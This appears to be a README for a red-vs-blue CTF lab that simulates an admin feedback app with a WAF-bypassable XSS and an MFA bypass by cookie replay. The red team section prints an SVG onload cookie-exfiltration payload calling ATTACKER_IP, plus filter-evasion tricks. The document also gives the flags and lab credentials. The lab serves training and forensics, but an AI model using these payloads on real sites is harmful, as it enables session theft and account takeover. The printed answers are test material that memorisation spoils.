# Cyber Range: Red vs. Blue CTF Lab

## Cookie Reuse & MFA Bypass Scenario

> **Role:** Cybersecurity Engineer (Lab & Range Developer)
> **Environment:** Docker / Proxmox VM

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Deployment Instructions](#deployment-instructions)
4. [Red Team Walkthrough](#red-team-walkthrough)
5. [Blue Team Walkthrough](#blue-team-walkthrough)

---

## Overview

This lab simulates a corporate **"Admin Feedback System"** with a critical authentication flaw. The application enforces Multi-Factor Authentication (MFA), but the session token issuance logic is flawed, allowing attackers to:

1. **Reconnaissance** - Discover hidden endpoints and technology stack
2. **Defense Evasion** - Bypass a WAF and perform XSS to steal cookies
3. **Session Replay / MFA Bypass** - Replay stolen admin cookies to bypass MFA

The environment generates realistic telemetry for Blue Team incident response and log forensics.

### Key Facts

| Item | Value |
|------|-------|
| Web App Port | **3075** |
| SSH Port | **2275** |
| SSH User/Pass | `analyst` / `blue_team_rocks` |
| Log Location | `/opt/admin/logs/` |
| Flag Format | `SCENARIO75{flag}` |

---

## Architecture

```
┌─────────────────────────────────────────────┐
│              Docker Container               │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │  Node.js + Express (port 3075)      │    │
│  │  - Vulnerable Web App               │    │
│  │  - WAF (bypassable)                 │    │
│  │  - Cookie-based session management  │    │
│  └─────────────────────────────────────┘    │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │  SSH Server (port 2275)             │    │
│  │  - Blue Team access                 │    │
│  │  - Credentials: analyst/blue_team   │    │
│  └─────────────────────────────────────┘    │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │  /opt/admin/logs/                   │    │
│  │  - access.log (Nginx-style)         │    │
│  │  - error.log (App security events)  │    │
│  └─────────────────────────────────────┘    │
│                                             │
│  Network: 10.10.14.0/24                     │
└─────────────────────────────────────────────┘
```

---

## Deployment Instructions

### Prerequisites

- Docker & Docker Compose installed
- Linux VM (or Proxmox host)

### Quick Start

```bash
# Clone the repository
git clone https://github.com/c4turla/cyber-lab.git
cd cyber-lab

# Build and start the container
docker compose up -d --build

# Verify services are running
docker compose ps

# Check logs
docker compose logs -f
```

### Verify Deployment

```bash
# Check web application
curl -I http://localhost:3075

# Check SSH access
ssh analyst@localhost -p 2275
# Password: blue_team_rocks

# Check log files (inside container)
docker exec -it admin-feedback-system cat /opt/admin/logs/access.log
docker exec -it admin-feedback-system cat /opt/admin/logs/error.log
```

### Stop / Clean Up

```bash
# Stop services
docker compose down

# Remove everything (including volumes)
docker compose down -v
```

---

## Red Team Walkthrough

### Phase 1: Reconnaissance

1. **Check HTTP headers**: `curl -I http://localhost:3075` → Note `X-Powered-By: Node.js`
2. **View page source**: Open HTML source → Find ASCII art comment hinting at `robots.txt`
3. **Check robots.txt**: `curl http://localhost:3075/robots.txt` → Reveals `/api/verify-mfa` and `/dashboard`
4. **Inspect cookies**: Note `pre_mfa_session=pending_mfa_verification` cookie set on first visit (HttpOnly: false)

### Phase 2: Defense Evasion (WAF Bypass + XSS)

1. **Test WAF**: Submit `<script>alert(1)</script>` via POST to `/api/feedback` → Returns 403 (blocked)
2. **Bypass WAF**: Use `<svg onload=...>` instead of `<script>` — WAF does not block HTML5 elements
3. **Bypass cookie access**: `document.cookie` is blocked, use `window['docu'+'ment']['coo'+'kie']`
4. **XSS + Exfiltration payload**:
   ```html
   <svg onload="fetch('http://ATTACKER_IP/?c='+window['docu'+'ment']['coo'+'kie'])">
   ```

### Phase 3: Session Replay & MFA Bypass

1. **Steal admin cookie**: The XSS payload exfiltrates the `adm_sess` cookie via `fetch`
2. **Replay cookie**: Set the stolen `adm_sess` cookie in your browser
3. **Access dashboard**: Navigate to `/dashboard` — MFA is completely skipped because the backend checks for `adm_sess` cookie and bypasses `/api/verify-mfa`
4. **Find the final flag**: In the System Configuration section of the dashboard: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

---

## Blue Team Walkthrough

### Phase 1: Log Forensics

1. **SSH into the system**: `ssh analyst@<TARGET> -p 2275` (password: `blue_team_rocks`)
2. **Find logs**: Check `/opt/admin/logs/` for `access.log` and `error.log`
3. **Identify attacker**: Search logs for unusual IPs → `10.10.14.50` with `Mozilla/5.0` User-Agent
4. **Dashboard access**: Find the successful 200 status for `/dashboard` at timestamp `18:51:55`
5. **Exfiltration evidence**: Note the Base64 string in the `X-Forwarded-For` field

### Phase 2: Threat Hunting

1. **Baseline traffic**: Identify legitimate admin traffic from `192.168.1.100`
2. **Attacker subnet**: The attacker IP `10.10.14.50` belongs to `10.10.14.0/24`
3. **WAF alerts**: Check `error.log` — first WAF block for `<script>` at `18:50:15`
4. **MFA verification**: Confirm the attacker IP never reached the MFA endpoint (answer: No)

### Phase 3: Incident Response

1. **Encoding analysis**: Identify the encoding as `Base64`, string is `44` characters
2. **Decode**: The Base64 string decodes to the Blue Team victory flag
3. **Severity**: Cookie reuse events are flagged at `CRITICAL` level
4. **Anomaly**: Check `error.log` entry at `18:53:10` for the string: `Authentication bypass anomaly`
5. **Final flag**: Decode the Base64 string → `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

---

## Troubleshooting

### Container keeps restarting

```bash
# Check container logs for errors
docker compose logs --tail=50

# Rebuild from scratch
docker compose down -v
docker compose up -d --build

# Verify health
docker compose ps
```

### Port conflicts

```bash
# Check if ports 3075 or 2275 are already in use
ss -tlnp | grep -E '3075|2275'
# Or on macOS:
lsof -i :3075
```
